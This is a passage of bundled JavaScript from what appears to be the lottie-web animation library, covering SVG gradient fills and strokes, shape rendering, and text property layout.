                  this.o[a - this.data.p * 4] !== tt &&
                    ((this.o[a - this.data.p * 4] = tt), (this._omdf = !i));
            this._mdf = !i;
          }
        }),
        extendPrototype([DynamicPropertyContainer], GradientProperty);
      function SVGGradientFillStyleData(i, a, o) {
        this.initDynamicPropertyContainer(i),
          (this.getValue = this.iterateDynamicProperties),
          this.initGradientData(i, a, o);
      }
      (SVGGradientFillStyleData.prototype.initGradientData = function (
        i,
        a,
        o
      ) {
        (this.o = PropertyFactory.getProp(i, a.o, 0, 0.01, this)),
          (this.s = PropertyFactory.getProp(i, a.s, 1, null, this)),
          (this.e = PropertyFactory.getProp(i, a.e, 1, null, this)),
          (this.h = PropertyFactory.getProp(i, a.h || { k: 0 }, 0, 0.01, this)),
          (this.a = PropertyFactory.getProp(
            i,
            a.a || { k: 0 },
            0,
            degToRads,
            this
          )),
          (this.g = new GradientProperty(i, a.g, this)),
          (this.style = o),
          (this.stops = []),
          this.setGradientData(o.pElem, a),
          this.setGradientOpacity(a, o),
          (this._isAnimated = !!this._isAnimated);
      }),
        (SVGGradientFillStyleData.prototype.setGradientData = function (i, a) {
          var o = createElementID(),
            s = createNS(a.t === 1 ? "linearGradient" : "radialGradient");
          s.setAttribute("id", o),
            s.setAttribute("spreadMethod", "pad"),
            s.setAttribute("gradientUnits", "userSpaceOnUse");
          var tt = [],
            nt,
            ot,
            st;
          for (st = a.g.p * 4, ot = 0; ot < st; ot += 4)
            (nt = createNS("stop")), s.appendChild(nt), tt.push(nt);
          i.setAttribute(
            a.ty === "gf" ? "fill" : "stroke",
            "url(" + getLocationHref() + "#" + o + ")"
          ),
            (this.gf = s),
            (this.cst = tt);
        }),
        (SVGGradientFillStyleData.prototype.setGradientOpacity = function (
          i,
          a
        ) {
          if (this.g._hasOpacity && !this.g._collapsable) {
            var o,
              s,
              tt,
              nt = createNS("mask"),
              ot = createNS("path");
            nt.appendChild(ot);
            var st = createElementID(),
              ft = createElementID();
            nt.setAttribute("id", ft);
            var ht = createNS(i.t === 1 ? "linearGradient" : "radialGradient");
            ht.setAttribute("id", st),
              ht.setAttribute("spreadMethod", "pad"),
              ht.setAttribute("gradientUnits", "userSpaceOnUse"),
              (tt = i.g.k.k[0].s ? i.g.k.k[0].s.length : i.g.k.k.length);
            var gt = this.stops;
            for (s = i.g.p * 4; s < tt; s += 2)
              (o = createNS("stop")),
                o.setAttribute("stop-color", "rgb(255,255,255)"),
                ht.appendChild(o),
                gt.push(o);
            ot.setAttribute(
              i.ty === "gf" ? "fill" : "stroke",
              "url(" + getLocationHref() + "#" + st + ")"
            ),
              i.ty === "gs" &&
                (ot.setAttribute("stroke-linecap", lineCapEnum[i.lc || 2]),
                ot.setAttribute("stroke-linejoin", lineJoinEnum[i.lj || 2]),
                i.lj === 1 && ot.setAttribute("stroke-miterlimit", i.ml)),
              (this.of = ht),
              (this.ms = nt),
              (this.ost = gt),
              (this.maskId = ft),
              (a.msElem = ot);
          }
        }),
        extendPrototype([DynamicPropertyContainer], SVGGradientFillStyleData);
      function SVGGradientStrokeStyleData(i, a, o) {
        this.initDynamicPropertyContainer(i),
          (this.getValue = this.iterateDynamicProperties),
          (this.w = PropertyFactory.getProp(i, a.w, 0, null, this)),
          (this.d = new DashProperty(i, a.d || {}, "svg", this)),
          this.initGradientData(i, a, o),
          (this._isAnimated = !!this._isAnimated);
      }
      extendPrototype(
        [SVGGradientFillStyleData, DynamicPropertyContainer],
        SVGGradientStrokeStyleData
      );
      function ShapeGroupData() {
        (this.it = []), (this.prevViewData = []), (this.gr = createNS("g"));
      }
      function SVGTransformData(i, a, o) {
        (this.transform = { mProps: i, op: a, container: o }),
          (this.elements = []),
          (this._isAnimated =
            this.transform.mProps.dynamicProperties.length ||
            this.transform.op.effectsSequence.length);
      }
      var buildShapeString = function (a, o, s, tt) {
          if (o === 0) return "";
          var nt = a.o,
            ot = a.i,
            st = a.v,
            ft,
            ht = " M" + tt.applyToPointStringified(st[0][0], st[0][1]);
          for (ft = 1; ft < o; ft += 1)
            ht +=
              " C" +
              tt.applyToPointStringified(nt[ft - 1][0], nt[ft - 1][1]) +
              " " +
              tt.applyToPointStringified(ot[ft][0], ot[ft][1]) +
              " " +
              tt.applyToPointStringified(st[ft][0], st[ft][1]);
          return (
            s &&
              o &&
              ((ht +=
                " C" +
                tt.applyToPointStringified(nt[ft - 1][0], nt[ft - 1][1]) +
                " " +
                tt.applyToPointStringified(ot[0][0], ot[0][1]) +
                " " +
                tt.applyToPointStringified(st[0][0], st[0][1])),
              (ht += "z")),
            ht
          );
        },
        SVGElementsRenderer = (function () {
          var i = new Matrix(),
            a = new Matrix(),
            o = { createRenderFunction: s };
          function s(St) {
            switch (St.ty) {
              case "fl":
                return st;
              case "gf":
                return ht;
              case "gs":
                return ft;
              case "st":
                return gt;
              case "sh":
              case "el":
              case "rc":
              case "sr":
                return ot;
              case "tr":
                return tt;
              case "no":
                return nt;
              default:
                return null;
            }
          }
          function tt(St, vt, _t) {
            (_t || vt.transform.op._mdf) &&
              vt.transform.container.setAttribute("opacity", vt.transform.op.v),
              (_t || vt.transform.mProps._mdf) &&
                vt.transform.container.setAttribute(
                  "transform",
                  vt.transform.mProps.v.to2dCSS()
                );
          }
          function nt() {}
          function ot(St, vt, _t) {
            var Et,
              Ct,
              Pt,
              bt,
              xt,
              yt,
              wt = vt.styles.length,
              $t = vt.lvl,
              kt,
              Rt,
              It,
              Ot;
            for (yt = 0; yt < wt; yt += 1) {
              if (((bt = vt.sh._mdf || _t), vt.styles[yt].lvl < $t)) {
                for (
                  Rt = a.reset(),
                    It = $t - vt.styles[yt].lvl,
                    Ot = vt.transformers.length - 1;
                  !bt && It > 0;

                )
                  (bt = vt.transformers[Ot].mProps._mdf || bt),
                    (It -= 1),
                    (Ot -= 1);
                if (bt)
                  for (
                    It = $t - vt.styles[yt].lvl,
                      Ot = vt.transformers.length - 1;
                    It > 0;

                  )
                    Rt.multiply(vt.transformers[Ot].mProps.v),
                      (It -= 1),
                      (Ot -= 1);
              } else Rt = i;
              if (((kt = vt.sh.paths), (Ct = kt._length), bt)) {
                for (Pt = "", Et = 0; Et < Ct; Et += 1)
                  (xt = kt.shapes[Et]),
                    xt &&
                      xt._length &&
                      (Pt += buildShapeString(xt, xt._length, xt.c, Rt));
                vt.caches[yt] = Pt;
              } else Pt = vt.caches[yt];
              (vt.styles[yt].d += St.hd === !0 ? "" : Pt),
                (vt.styles[yt]._mdf = bt || vt.styles[yt]._mdf);
            }
          }
          function st(St, vt, _t) {
            var Et = vt.style;
            (vt.c._mdf || _t) &&
              Et.pElem.setAttribute(
                "fill",
                "rgb(" +
                  bmFloor(vt.c.v[0]) +
                  "," +
                  bmFloor(vt.c.v[1]) +
                  "," +
                  bmFloor(vt.c.v[2]) +
                  ")"
              ),
              (vt.o._mdf || _t) &&
                Et.pElem.setAttribute("fill-opacity", vt.o.v);
          }
          function ft(St, vt, _t) {
            ht(St, vt, _t), gt(St, vt, _t);
          }
          function ht(St, vt, _t) {
            var Et = vt.gf,
              Ct = vt.g._hasOpacity,
              Pt = vt.s.v,
              bt = vt.e.v;
            if (vt.o._mdf || _t) {
              var xt = St.ty === "gf" ? "fill-opacity" : "stroke-opacity";
              vt.style.pElem.setAttribute(xt, vt.o.v);
            }
            if (vt.s._mdf || _t) {
              var yt = St.t === 1 ? "x1" : "cx",
                wt = yt === "x1" ? "y1" : "cy";
              Et.setAttribute(yt, Pt[0]),
                Et.setAttribute(wt, Pt[1]),
                Ct &&
                  !vt.g._collapsable &&
                  (vt.of.setAttribute(yt, Pt[0]),
                  vt.of.setAttribute(wt, Pt[1]));
            }
            var $t, kt, Rt, It;
            if (vt.g._cmdf || _t) {
              $t = vt.cst;
              var Ot = vt.g.c;
              for (Rt = $t.length, kt = 0; kt < Rt; kt += 1)
                (It = $t[kt]),
                  It.setAttribute("offset", Ot[kt * 4] + "%"),
                  It.setAttribute(
                    "stop-color",
                    "rgb(" +
                      Ot[kt * 4 + 1] +
                      "," +
                      Ot[kt * 4 + 2] +
                      "," +
                      Ot[kt * 4 + 3] +
                      ")"
                  );
            }
            if (Ct && (vt.g._omdf || _t)) {
              var Nt = vt.g.o;
              for (
                vt.g._collapsable ? ($t = vt.cst) : ($t = vt.ost),
                  Rt = $t.length,
                  kt = 0;
                kt < Rt;
                kt += 1
              )
                (It = $t[kt]),
                  vt.g._collapsable ||
                    It.setAttribute("offset", Nt[kt * 2] + "%"),
                  It.setAttribute("stop-opacity", Nt[kt * 2 + 1]);
            }
            if (St.t === 1)
              (vt.e._mdf || _t) &&
                (Et.setAttribute("x2", bt[0]),
                Et.setAttribute("y2", bt[1]),
                Ct &&
                  !vt.g._collapsable &&
                  (vt.of.setAttribute("x2", bt[0]),
                  vt.of.setAttribute("y2", bt[1])));
            else {
              var zt;
              if (
                ((vt.s._mdf || vt.e._mdf || _t) &&
                  ((zt = Math.sqrt(
                    Math.pow(Pt[0] - bt[0], 2) + Math.pow(Pt[1] - bt[1], 2)
                  )),
                  Et.setAttribute("r", zt),
                  Ct && !vt.g._collapsable && vt.of.setAttribute("r", zt)),
                vt.e._mdf || vt.h._mdf || vt.a._mdf || _t)
              ) {
                zt ||
                  (zt = Math.sqrt(
                    Math.pow(Pt[0] - bt[0], 2) + Math.pow(Pt[1] - bt[1], 2)
                  ));
                var Bt = Math.atan2(bt[1] - Pt[1], bt[0] - Pt[0]),
                  Wt = vt.h.v;
                Wt >= 1 ? (Wt = 0.99) : Wt <= -1 && (Wt = -0.99);
                var Gt = zt * Wt,
                  Vt = Math.cos(Bt + vt.a.v) * Gt + Pt[0],
                  Mt = Math.sin(Bt + vt.a.v) * Gt + Pt[1];
                Et.setAttribute("fx", Vt),
                  Et.setAttribute("fy", Mt),
                  Ct &&
                    !vt.g._collapsable &&
                    (vt.of.setAttribute("fx", Vt),
                    vt.of.setAttribute("fy", Mt));
              }
            }
          }
          function gt(St, vt, _t) {
            var Et = vt.style,
              Ct = vt.d;
            Ct &&
              (Ct._mdf || _t) &&
              Ct.dashStr &&
              (Et.pElem.setAttribute("stroke-dasharray", Ct.dashStr),
              Et.pElem.setAttribute("stroke-dashoffset", Ct.dashoffset[0])),
              vt.c &&
                (vt.c._mdf || _t) &&
                Et.pElem.setAttribute(
                  "stroke",
                  "rgb(" +
                    bmFloor(vt.c.v[0]) +
                    "," +
                    bmFloor(vt.c.v[1]) +
                    "," +
                    bmFloor(vt.c.v[2]) +
                    ")"
                ),
              (vt.o._mdf || _t) &&
                Et.pElem.setAttribute("stroke-opacity", vt.o.v),
              (vt.w._mdf || _t) &&
                (Et.pElem.setAttribute("stroke-width", vt.w.v),
                Et.msElem && Et.msElem.setAttribute("stroke-width", vt.w.v));
          }
          return o;
        })();
      function SVGShapeElement(i, a, o) {
        (this.shapes = []),
          (this.shapesData = i.shapes),
          (this.stylesList = []),
          (this.shapeModifiers = []),
          (this.itemsData = []),
          (this.processedElements = []),
          (this.animatedContents = []),
          this.initElement(i, a, o),
          (this.prevViewData = []);
      }
      extendPrototype(
        [
          BaseElement,
          TransformElement,
          SVGBaseElement,
          IShapeElement,
          HierarchyElement,
          FrameElement,
          RenderableDOMElement,
        ],
        SVGShapeElement
      ),
        (SVGShapeElement.prototype.initSecondaryElement = function () {}),
        (SVGShapeElement.prototype.identityMatrix = new Matrix()),
        (SVGShapeElement.prototype.buildExpressionInterface = function () {}),
        (SVGShapeElement.prototype.createContent = function () {
          this.searchShapes(
            this.shapesData,
            this.itemsData,
            this.prevViewData,
            this.layerElement,
            0,
            [],
            !0
          ),
            this.filterUniqueShapes();
        }),
        (SVGShapeElement.prototype.filterUniqueShapes = function () {
          var i,
            a = this.shapes.length,
            o,
            s,
            tt = this.stylesList.length,
            nt,
            ot = [],
            st = !1;
          for (s = 0; s < tt; s += 1) {
            for (
              nt = this.stylesList[s], st = !1, ot.length = 0, i = 0;
              i < a;
              i += 1
            )
              (o = this.shapes[i]),
                o.styles.indexOf(nt) !== -1 &&
                  (ot.push(o), (st = o._isAnimated || st));
            ot.length > 1 && st && this.setShapesAsAnimated(ot);
          }
        }),
        (SVGShapeElement.prototype.setShapesAsAnimated = function (i) {
          var a,
            o = i.length;
          for (a = 0; a < o; a += 1) i[a].setAsAnimated();
        }),
        (SVGShapeElement.prototype.createStyleElement = function (i, a) {
          var o,
            s = new SVGStyleData(i, a),
            tt = s.pElem;
          if (i.ty === "st") o = new SVGStrokeStyleData(this, i, s);
          else if (i.ty === "fl") o = new SVGFillStyleData(this, i, s);
          else if (i.ty === "gf" || i.ty === "gs") {
            var nt =
              i.ty === "gf"
                ? SVGGradientFillStyleData
                : SVGGradientStrokeStyleData;
            (o = new nt(this, i, s)),
              this.globalData.defs.appendChild(o.gf),
              o.maskId &&
                (this.globalData.defs.appendChild(o.ms),
                this.globalData.defs.appendChild(o.of),
                tt.setAttribute(
                  "mask",
                  "url(" + getLocationHref() + "#" + o.maskId + ")"
                ));
          } else i.ty === "no" && (o = new SVGNoStyleData(this, i, s));
          return (
            (i.ty === "st" || i.ty === "gs") &&
              (tt.setAttribute("stroke-linecap", lineCapEnum[i.lc || 2]),
              tt.setAttribute("stroke-linejoin", lineJoinEnum[i.lj || 2]),
              tt.setAttribute("fill-opacity", "0"),
              i.lj === 1 && tt.setAttribute("stroke-miterlimit", i.ml)),
            i.r === 2 && tt.setAttribute("fill-rule", "evenodd"),
            i.ln && tt.setAttribute("id", i.ln),
            i.cl && tt.setAttribute("class", i.cl),
            i.bm && (tt.style["mix-blend-mode"] = getBlendMode(i.bm)),
            this.stylesList.push(s),
            this.addToAnimatedContents(i, o),
            o
          );
        }),
        (SVGShapeElement.prototype.createGroupElement = function (i) {
          var a = new ShapeGroupData();
          return (
            i.ln && a.gr.setAttribute("id", i.ln),
            i.cl && a.gr.setAttribute("class", i.cl),
            i.bm && (a.gr.style["mix-blend-mode"] = getBlendMode(i.bm)),
            a
          );
        }),
        (SVGShapeElement.prototype.createTransformElement = function (i, a) {
          var o = TransformPropertyFactory.getTransformProperty(this, i, this),
            s = new SVGTransformData(o, o.o, a);
          return this.addToAnimatedContents(i, s), s;
        }),
        (SVGShapeElement.prototype.createShapeElement = function (i, a, o) {
          var s = 4;
          i.ty === "rc"
            ? (s = 5)
            : i.ty === "el"
            ? (s = 6)
            : i.ty === "sr" && (s = 7);
          var tt = ShapePropertyFactory.getShapeProp(this, i, s, this),
            nt = new SVGShapeData(a, o, tt);
          return (
            this.shapes.push(nt),
            this.addShapeToModifiers(nt),
            this.addToAnimatedContents(i, nt),
            nt
          );
        }),
        (SVGShapeElement.prototype.addToAnimatedContents = function (i, a) {
          for (var o = 0, s = this.animatedContents.length; o < s; ) {
            if (this.animatedContents[o].element === a) return;
            o += 1;
          }
          this.animatedContents.push({
            fn: SVGElementsRenderer.createRenderFunction(i),
            element: a,
            data: i,
          });
        }),
        (SVGShapeElement.prototype.setElementStyles = function (i) {
          var a = i.styles,
            o,
            s = this.stylesList.length;
          for (o = 0; o < s; o += 1)
            this.stylesList[o].closed || a.push(this.stylesList[o]);
        }),
        (SVGShapeElement.prototype.reloadShapes = function () {
          this._isFirstFrame = !0;
          var i,
            a = this.itemsData.length;
          for (i = 0; i < a; i += 1) this.prevViewData[i] = this.itemsData[i];
          for (
            this.searchShapes(
              this.shapesData,
              this.itemsData,
              this.prevViewData,
              this.layerElement,
              0,
              [],
              !0
            ),
              this.filterUniqueShapes(),
              a = this.dynamicProperties.length,
              i = 0;
            i < a;
            i += 1
          )
            this.dynamicProperties[i].getValue();
          this.renderModifiers();
        }),
        (SVGShapeElement.prototype.searchShapes = function (
          i,
          a,
          o,
          s,
          tt,
          nt,
          ot
        ) {
          var st = [].concat(nt),
            ft,
            ht = i.length - 1,
            gt,
            St,
            vt = [],
            _t = [],
            Et,
            Ct,
            Pt;
          for (ft = ht; ft >= 0; ft -= 1) {
            if (
              ((Pt = this.searchProcessedElement(i[ft])),
              Pt ? (a[ft] = o[Pt - 1]) : (i[ft]._render = ot),
              i[ft].ty === "fl" ||
                i[ft].ty === "st" ||
                i[ft].ty === "gf" ||
                i[ft].ty === "gs" ||
                i[ft].ty === "no")
            )
              Pt
                ? (a[ft].style.closed = !1)
                : (a[ft] = this.createStyleElement(i[ft], tt)),
                i[ft]._render &&
                  a[ft].style.pElem.parentNode !== s &&
                  s.appendChild(a[ft].style.pElem),
                vt.push(a[ft].style);
            else if (i[ft].ty === "gr") {
              if (!Pt) a[ft] = this.createGroupElement(i[ft]);
              else
                for (St = a[ft].it.length, gt = 0; gt < St; gt += 1)
                  a[ft].prevViewData[gt] = a[ft].it[gt];
              this.searchShapes(
                i[ft].it,
                a[ft].it,
                a[ft].prevViewData,
                a[ft].gr,
                tt + 1,
                st,
                ot
              ),
                i[ft]._render &&
                  a[ft].gr.parentNode !== s &&
                  s.appendChild(a[ft].gr);
            } else
              i[ft].ty === "tr"
                ? (Pt || (a[ft] = this.createTransformElement(i[ft], s)),
                  (Et = a[ft].transform),
                  st.push(Et))
                : i[ft].ty === "sh" ||
                  i[ft].ty === "rc" ||
                  i[ft].ty === "el" ||
                  i[ft].ty === "sr"
                ? (Pt || (a[ft] = this.createShapeElement(i[ft], st, tt)),
                  this.setElementStyles(a[ft]))
                : i[ft].ty === "tm" ||
                  i[ft].ty === "rd" ||
                  i[ft].ty === "ms" ||
                  i[ft].ty === "pb" ||
                  i[ft].ty === "zz" ||
                  i[ft].ty === "op"
                ? (Pt
                    ? ((Ct = a[ft]), (Ct.closed = !1))
                    : ((Ct = ShapeModifiers.getModifier(i[ft].ty)),
                      Ct.init(this, i[ft]),
                      (a[ft] = Ct),
                      this.shapeModifiers.push(Ct)),
                  _t.push(Ct))
                : i[ft].ty === "rp" &&
                  (Pt
                    ? ((Ct = a[ft]), (Ct.closed = !0))
                    : ((Ct = ShapeModifiers.getModifier(i[ft].ty)),
                      (a[ft] = Ct),
                      Ct.init(this, i, ft, a),
                      this.shapeModifiers.push(Ct),
                      (ot = !1)),
                  _t.push(Ct));
            this.addProcessedElement(i[ft], ft + 1);
          }
          for (ht = vt.length, ft = 0; ft < ht; ft += 1) vt[ft].closed = !0;
          for (ht = _t.length, ft = 0; ft < ht; ft += 1) _t[ft].closed = !0;
        }),
        (SVGShapeElement.prototype.renderInnerContent = function () {
          this.renderModifiers();
          var i,
            a = this.stylesList.length;
          for (i = 0; i < a; i += 1) this.stylesList[i].reset();
          for (this.renderShape(), i = 0; i < a; i += 1)
            (this.stylesList[i]._mdf || this._isFirstFrame) &&
              (this.stylesList[i].msElem &&
                (this.stylesList[i].msElem.setAttribute(
                  "d",
                  this.stylesList[i].d
                ),
                (this.stylesList[i].d = "M0 0" + this.stylesList[i].d)),
              this.stylesList[i].pElem.setAttribute(
                "d",
                this.stylesList[i].d || "M0 0"
              ));
        }),
        (SVGShapeElement.prototype.renderShape = function () {
          var i,
            a = this.animatedContents.length,
            o;
          for (i = 0; i < a; i += 1)
            (o = this.animatedContents[i]),
              (this._isFirstFrame || o.element._isAnimated) &&
                o.data !== !0 &&
                o.fn(o.data, o.element, this._isFirstFrame);
        }),
        (SVGShapeElement.prototype.destroy = function () {
          this.destroyBaseElement(),
            (this.shapesData = null),
            (this.itemsData = null);
        });
      function LetterProps(i, a, o, s, tt, nt) {
        (this.o = i),
          (this.sw = a),
          (this.sc = o),
          (this.fc = s),
          (this.m = tt),
          (this.p = nt),
          (this._mdf = { o: !0, sw: !!a, sc: !!o, fc: !!s, m: !0, p: !0 });
      }
      LetterProps.prototype.update = function (i, a, o, s, tt, nt) {
        (this._mdf.o = !1),
          (this._mdf.sw = !1),
          (this._mdf.sc = !1),
          (this._mdf.fc = !1),
          (this._mdf.m = !1),
          (this._mdf.p = !1);
        var ot = !1;
        return (
          this.o !== i && ((this.o = i), (this._mdf.o = !0), (ot = !0)),
          this.sw !== a && ((this.sw = a), (this._mdf.sw = !0), (ot = !0)),
          this.sc !== o && ((this.sc = o), (this._mdf.sc = !0), (ot = !0)),
          this.fc !== s && ((this.fc = s), (this._mdf.fc = !0), (ot = !0)),
          this.m !== tt && ((this.m = tt), (this._mdf.m = !0), (ot = !0)),
          nt.length &&
            (this.p[0] !== nt[0] ||
              this.p[1] !== nt[1] ||
              this.p[4] !== nt[4] ||
              this.p[5] !== nt[5] ||
              this.p[12] !== nt[12] ||
              this.p[13] !== nt[13]) &&
            ((this.p = nt), (this._mdf.p = !0), (ot = !0)),
          ot
        );
      };
      function TextProperty(i, a) {
        (this._frameId = initialDefaultFrame),
          (this.pv = ""),
          (this.v = ""),
          (this.kf = !1),
          (this._isFirstFrame = !0),
          (this._mdf = !1),
          a.d && a.d.sid && (a.d = i.globalData.slotManager.getProp(a.d)),
          (this.data = a),
          (this.elem = i),
          (this.comp = this.elem.comp),
          (this.keysIndex = 0),
          (this.canResize = !1),
          (this.minimumFontSize = 1),
          (this.effectsSequence = []),
          (this.currentData = {
            ascent: 0,
            boxWidth: this.defaultBoxWidth,
            f: "",
            fStyle: "",
            fWeight: "",
            fc: "",
            j: "",
            justifyOffset: "",
            l: [],
            lh: 0,
            lineWidths: [],
            ls: "",
            of: "",
            s: "",
            sc: "",
            sw: 0,
            t: 0,
            tr: 0,
            sz: 0,
            ps: null,
            fillColorAnim: !1,
            strokeColorAnim: !1,
            strokeWidthAnim: !1,
            yOffset: 0,
            finalSize: 0,
            finalText: [],
            finalLineHeight: 0,
            __complete: !1,
          }),
          this.copyData(this.currentData, this.data.d.k[0].s),
          this.searchProperty() || this.completeTextData(this.currentData);
      }
      (TextProperty.prototype.defaultBoxWidth = [0, 0]),
        (TextProperty.prototype.copyData = function (i, a) {
          for (var o in a)
            Object.prototype.hasOwnProperty.call(a, o) && (i[o] = a[o]);
          return i;
        }),
        (TextProperty.prototype.setCurrentData = function (i) {
          i.__complete || this.completeTextData(i),
            (this.currentData = i),
            (this.currentData.boxWidth =
              this.currentData.boxWidth || this.defaultBoxWidth),
            (this._mdf = !0);
        }),
        (TextProperty.prototype.searchProperty = function () {
          return this.searchKeyframes();
        }),
        (TextProperty.prototype.searchKeyframes = function () {
          return (
            (this.kf = this.data.d.k.length > 1),
            this.kf && this.addEffect(this.getKeyframeValue.bind(this)),
            this.kf
          );
        }),
        (TextProperty.prototype.addEffect = function (i) {
          this.effectsSequence.push(i), this.elem.addDynamicProperty(this);
        }),
        (TextProperty.prototype.getValue = function (i) {
          if (
            !(
              (this.elem.globalData.frameId === this.frameId ||
                !this.effectsSequence.length) &&
              !i
            )
          ) {
            this.currentData.t = this.data.d.k[this.keysIndex].s.t;
            var a = this.currentData,
              o = this.keysIndex;
            if (this.lock) {
              this.setCurrentData(this.currentData);
              return;
            }
            (this.lock = !0), (this._mdf = !1);
            var s,
              tt = this.effectsSequence.length,
              nt = i || this.data.d.k[this.keysIndex].s;
            for (s = 0; s < tt; s += 1)
              o !== this.keysIndex
                ? (nt = this.effectsSequence[s](nt, nt.t))
                : (nt = this.effectsSequence[s](this.currentData, nt.t));
            a !== nt && this.setCurrentData(nt),
              (this.v = this.currentData),
              (this.pv = this.v),
              (this.lock = !1),
              (this.frameId = this.elem.globalData.frameId);
          }
        }),
        (TextProperty.prototype.getKeyframeValue = function () {
          for (
            var i = this.data.d.k,
              a = this.elem.comp.renderedFrame,
              o = 0,
              s = i.length;
            o <= s - 1 && !(o === s - 1 || i[o + 1].t > a);

          )
            o += 1;
          return (
            this.keysIndex !== o && (this.keysIndex = o),
            this.data.d.k[this.keysIndex].s
          );
        }),
        (TextProperty.prototype.buildFinalText = function (i) {
          for (
            var a = [], o = 0, s = i.length, tt, nt, ot = !1, st = !1, ft = "";
            o < s;

          )
            (ot = st),
              (st = !1),
              (tt = i.charCodeAt(o)),
              (ft = i.charAt(o)),
              FontManager.isCombinedCharacter(tt)
                ? (ot = !0)
                : tt >= 55296 && tt <= 56319
                ? FontManager.isRegionalFlag(i, o)
                  ? (ft = i.substr(o, 14))
                  : ((nt = i.charCodeAt(o + 1)),
                    nt >= 56320 &&
                      nt <= 57343 &&
                      (FontManager.isModifier(tt, nt)
                        ? ((ft = i.substr(o, 2)), (ot = !0))
                        : FontManager.isFlagEmoji(i.substr(o, 4))
                        ? (ft = i.substr(o, 4))
                        : (ft = i.substr(o, 2))))
                : tt > 56319
                ? ((nt = i.charCodeAt(o + 1)),
                  FontManager.isVariationSelector(tt) && (ot = !0))
                : FontManager.isZeroWidthJoiner(tt) && ((ot = !0), (st = !0)),
              ot ? ((a[a.length - 1] += ft), (ot = !1)) : a.push(ft),
              (o += ft.length);
          return a;
        }),
        (TextProperty.prototype.completeTextData = function (i) {
          i.__complete = !0;
          var a = this.elem.globalData.fontManager,
            o = this.data,
            s = [],
            tt,
            nt,
            ot,
            st = 0,
            ft,
            ht = o.m.g,
            gt = 0,
            St = 0,
            vt = 0,
            _t = [],
            Et = 0,
            Ct = 0,
            Pt,
            bt,
            xt = a.getFontByName(i.f),
            yt,
            wt = 0,
            $t = getFontProperties(xt);
          (i.fWeight = $t.weight),
            (i.fStyle = $t.style),
            (i.finalSize = i.s),
            (i.finalText = this.buildFinalText(i.t)),
            (nt = i.finalText.length),
            (i.finalLineHeight = i.lh);
          var kt = (i.tr / 1e3) * i.finalSize,
            Rt;
          if (i.sz)
            for (var It = !0, Ot = i.sz[0], Nt = i.sz[1], zt, Bt; It; ) {
              (Bt = this.buildFinalText(i.t)),
                (zt = 0),
                (Et = 0),
                (nt = Bt.length),
                (kt = (i.tr / 1e3) * i.finalSize);
              var Wt = -1;
              for (tt = 0; tt < nt; tt += 1)
                (Rt = Bt[tt].charCodeAt(0)),
                  (ot = !1),
                  Bt[tt] === " "
                    ? (Wt = tt)
                    : (Rt === 13 || Rt === 3) &&
                      ((Et = 0),
                      (ot = !0),
                      (zt += i.finalLineHeight || i.finalSize * 1.2)),
                  a.chars
                    ? ((yt = a.getCharData(Bt[tt], xt.fStyle, xt.fFamily)),
                      (wt = ot ? 0 : (yt.w * i.finalSize) / 100))
                    : (wt = a.measureText(Bt[tt], i.f, i.finalSize)),
                  Et + wt > Ot && Bt[tt] !== " "
                    ? (Wt === -1 ? (nt += 1) : (tt = Wt),
                      (zt += i.finalLineHeight || i.finalSize * 1.2),
                      Bt.splice(tt, Wt === tt ? 1 : 0, "\r"),
                      (Wt = -1),
                      (Et = 0))
                    : ((Et += wt), (Et += kt));
              (zt += (xt.ascent * i.finalSize) / 100),
                this.canResize && i.finalSize > this.minimumFontSize && Nt < zt
                  ? ((i.finalSize -= 1),
                    (i.finalLineHeight = (i.finalSize * i.lh) / i.s))
                  : ((i.finalText = Bt), (nt = i.finalText.length), (It = !1));
            }
          (Et = -kt), (wt = 0);
          var Gt = 0,
            Vt;
          for (tt = 0; tt < nt; tt += 1)
            if (
              ((ot = !1),
              (Vt = i.finalText[tt]),
              (Rt = Vt.charCodeAt(0)),
              Rt === 13 || Rt === 3
                ? ((Gt = 0),
                  _t.push(Et),
                  (Ct = Et > Ct ? Et : Ct),
                  (Et = -2 * kt),
                  (ft = ""),
                  (ot = !0),
                  (vt += 1))
                : (ft = Vt),
              a.chars
                ? ((yt = a.getCharData(
                    Vt,
                    xt.fStyle,
                    a.getFontByName(i.f).fFamily
                  )),
                  (wt = ot ? 0 : (yt.w * i.finalSize) / 100))
                : (wt = a.measureText(ft, i.f, i.finalSize)),
              Vt === " " ? (Gt += wt + kt) : ((Et += wt + kt + Gt), (Gt = 0)),
              s.push({
                l: wt,
                an: wt,
                add: gt,
                n: ot,
                anIndexes: [],
                val: ft,
                line: vt,
                animatorJustifyOffset: 0,
              }),
              ht == 2)
            ) {
              if (((gt += wt), ft === "" || ft === " " || tt === nt - 1)) {
                for ((ft === "" || ft === " ") && (gt -= wt); St <= tt; )
                  (s[St].an = gt),
                    (s[St].ind = st),
                    (s[St].extra = wt),
                    (St += 1);
                (st += 1), (gt = 0);
              }
            } else if (ht == 3) {
              if (((gt += wt), ft === "" || tt === nt - 1)) {
                for (ft === "" && (gt -= wt); St <= tt; )
                  (s[St].an = gt),
                    (s[St].ind = st),
                    (s[St].extra = wt),
                    (St += 1);
                (gt = 0), (st += 1);
              }
            } else (s[st].ind = st), (s[st].extra = 0), (st += 1);
          if (((i.l = s), (Ct = Et > Ct ? Et : Ct), _t.push(Et), i.sz))
            (i.boxWidth = i.sz[0]), (i.justifyOffset = 0);
          else
            switch (((i.boxWidth = Ct), i.j)) {
              case 1:
                i.justifyOffset = -i.boxWidth;
                break;
              case 2:
                i.justifyOffset = -i.boxWidth / 2;
                break;
              default:
                i.justifyOffset = 0;
            }
          i.lineWidths = _t;
          var Mt = o.a,
            Ft,
            Tt;
          bt = Mt.length;
          var At,
            Lt,
            jt = [];
          for (Pt = 0; Pt < bt; Pt += 1) {
            for (
              Ft = Mt[Pt],
                Ft.a.sc && (i.strokeColorAnim = !0),
                Ft.a.sw && (i.strokeWidthAnim = !0),
                (Ft.a.fc || Ft.a.fh || Ft.a.fs || Ft.a.fb) &&
                  (i.fillColorAnim = !0),
                Lt = 0,
                At = Ft.s.b,
                tt = 0;
              tt < nt;
              tt += 1
            )
              (Tt = s[tt]),
                (Tt.anIndexes[Pt] = Lt),
                ((At == 1 && Tt.val !== "") ||
                  (At == 2 && Tt.val !== "" && Tt.val !== " ") ||
                  (At == 3 && (Tt.n || Tt.val == " " || tt == nt - 1)) ||
                  (At == 4 && (Tt.n || tt == nt - 1))) &&
                  (Ft.s.rn === 1 && jt.push(Lt), (Lt += 1));
            o.a[Pt].s.totalChars = Lt;
            var Dt = -1,
              Ut;
            if (Ft.s.rn === 1)
              for (tt = 0; tt < nt; tt += 1)
                (Tt = s[tt]),
                  Dt != Tt.anIndexes[Pt] &&
                    ((Dt = Tt.anIndexes[Pt]),
